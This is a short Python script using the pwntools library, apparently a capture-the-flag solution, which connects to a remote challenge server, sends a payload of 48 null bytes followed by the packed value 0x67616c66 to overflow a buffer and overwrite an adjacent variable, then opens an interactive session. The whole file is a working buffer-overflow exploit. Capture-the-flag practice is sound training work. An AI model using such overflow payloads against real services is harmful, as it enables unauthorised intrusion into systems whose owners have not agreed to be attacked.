from pwn import *

p = remote('thekidofarcrania.com', 35235)

payload = b'\x00' * 48 + p32(0x67616c66)

p.sendline(payload)

p.interactive()
